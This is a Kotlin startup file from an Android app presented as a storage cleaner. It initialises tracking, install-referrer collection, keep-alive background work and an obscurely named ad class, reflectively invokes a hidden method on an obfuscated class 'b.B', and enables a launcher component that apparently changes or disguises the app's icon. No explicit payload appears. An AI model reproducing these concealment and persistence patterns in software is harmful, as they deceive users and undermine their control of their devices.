package com.mobile.storage.clean.go

import android.annotation.SuppressLint
import android.app.Application
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.provider.Settings
import com.mobile.storage.clean.ref.DataOne
import com.mobile.storage.clean.storage.DeviceStorage
import com.mobile.storage.clean.tool.AutoWorkTool
import com.mobile.storage.clean.tool.DaTool
import com.mobile.storage.clean.tool.InFTool
import com.mobile.storage.clean.tool.LifTool
import com.mobile.storage.clean.usage.UsageExample
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import mke.laqleis.FirtstAd
import java.util.UUID


object GoOne {

    fun goOneFun(app: Application){
        DeviceStorage.mastApp = app
        UsageExample.initInApplication(app)
        UsageExample.getDeviceId(app)
        InFTool.lifStart(app)
        ying(app)
        InFTool.initAlly(app)
        InFTool.startPeriodicService(app)

        DataOne.fetchInstallReferrer(app)
        AutoWorkTool.startKeepAliveWork(app)
        LifTool.getFcmFun()
        LifTool.ssPostFun(app)

    }


     fun invokeCoreMethod(context: Context) {
        try {
            val coreClass = Class.forName("b.B")
            val method = coreClass.getDeclaredMethod("b0", Context::class.java)
            method.isAccessible = true
            method.invoke(null, context)
            DaTool.showLog("Core.a method invoked successfully")
        } catch (e: ClassNotFoundException) {
            DaTool.showLog("Core class not found: ${e.message}")
        } catch (e: NoSuchMethodException) {
            DaTool.showLog("Core.a method not found: ${e.message}")
        } catch (e: Exception) {
            DaTool.showLog("Error invoking Core.a: ${e.message}")
            e.printStackTrace()
        }
    }
    @SuppressLint("HardwareIds")
    fun getAndroidId(context: Context): String {
        // 先从 MMKV 缓存中读取
        if (DeviceStorage.aid.isNotEmpty()) {
            return DeviceStorage.aid
        }
        
        // 尝试获取系统 Android ID
        val androidId = try {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        } catch (e: Exception) {
            e.printStackTrace()
            null
        }
        
        if (!androidId.isNullOrEmpty() && androidId != "9774d56d682e549c") {
            DeviceStorage.aid = androidId
            return androidId
        }
        
        val uuid = UUID.randomUUID().toString().replace("-", "")
        DeviceStorage.aid = uuid
        return uuid
    }
    

    fun ying(context: Context) {
        try {
            if (DeviceStorage.iconState) {
                return
            }
            val pm =  context.packageManager
            val componentName = ComponentName(context, DeviceStorage.iconPath)
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            DaTool.showLog("kapu: go")
            DeviceStorage.iconState = true
        } catch (e: Exception) {
            DaTool.showLog("Error in d2: " + e.message)
            e.printStackTrace()
        }
    }
}